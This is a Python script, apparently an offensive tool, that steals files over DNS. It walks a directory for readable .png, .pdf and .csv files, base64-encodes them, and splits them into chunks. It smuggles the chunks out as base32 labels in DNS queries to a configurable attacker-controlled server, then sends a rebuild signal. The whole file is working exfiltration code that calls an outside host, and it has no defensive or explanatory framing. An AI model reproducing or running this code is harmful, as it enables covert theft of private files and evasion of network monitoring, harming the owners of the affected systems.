import os
import socket
import base64
import random
import struct
import time

# configuration
# replace with your public ip or forwarded dns server
DNS_SERVER = 'ip'
DNS_PORT = 53
TARGET_DOMAIN = 'exfiltration.3a'
EXTS = ['.png', '.pdf', '.csv']

def build_query(payload_b32):
    # dns-safe labels (≤63 bytes per label, keep some headroom)
    labels = [payload_b32[i:i+50] for i in range(0, len(payload_b32), 50)]
    qname = b''.join([bytes([len(label)]) + label.encode() for label in labels])
    for part in TARGET_DOMAIN.split('.'):
        qname += bytes([len(part)]) + part.encode()
    qname += b'\x00'  # end of qname

    # standard dns query header (random txid)
    header = struct.pack('>HHHHHH', random.randint(0, 65535), 0x0100, 1, 0, 0, 0)
    question = qname + b'\x00\x01' + b'\x00\x01'  # type A, class IN
    return header + question

def send_payload(message):
    payload_b32 = base64.b32encode(message.encode()).decode().strip('=').lower()
    query = build_query(payload_b32)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(query, (DNS_SERVER, DNS_PORT))
    try:
        sock.settimeout(2)
        sock.recvfrom(512)  # wait for response
    except:
        pass
    sock.close()

def file_to_base64_chunks(file_path, chunk_size=200):
    with open(file_path, 'rb') as f:
        data = f.read()
    b64_encoded = base64.b64encode(data).decode()
    return [b64_encoded[i:i+chunk_size] for i in range(0, len(b64_encoded), chunk_size)]

def exfiltrate_file(filepath, delay_between_chunks=0.1):
    filename = os.path.basename(filepath)
    chunks = file_to_base64_chunks(filepath)

    print(f"[+] Exfiltrating '{filename}' with {len(chunks)} chunks")

    for idx, chunk in enumerate(chunks):
        payload = f"{filename}|--{idx}|--{chunk}"
        send_payload(payload)
        time.sleep(delay_between_chunks)

    # notify server to reconstruct
    send_payload("!rebuild!")
    print(f"[+] Sent rebuild command for '{filename}'")

def find_all_files(dir_path, extensions=None):
    if extensions:
        extensions = set(ext.lower() for ext in extensions)

    files = []
    for root, dirs, filenames in os.walk(dir_path, onerror=lambda _: None):
        accessible_dirs = []
        for d in dirs:
            full_dir = os.path.join(root, d)
            if os.access(full_dir, os.R_OK | os.X_OK):
                accessible_dirs.append(d)
        dirs[:] = accessible_dirs

        for filename in filenames:
            full_path = os.path.join(root, filename)
            if not os.access(full_path, os.R_OK):
                continue
            if extensions:
                if os.path.splitext(filename)[1].lower() not in extensions:
                    continue
            files.append(os.path.abspath(full_path))

    return files

if __name__ == '__main__':
    search_dir = "./testing_data/"
    files_to_exfiltrate = find_all_files(search_dir, EXTS)
    print(f"[+] Found {len(files_to_exfiltrate)} files to exfiltrate.")

    for filepath in files_to_exfiltrate:
        exfiltrate_file(filepath)
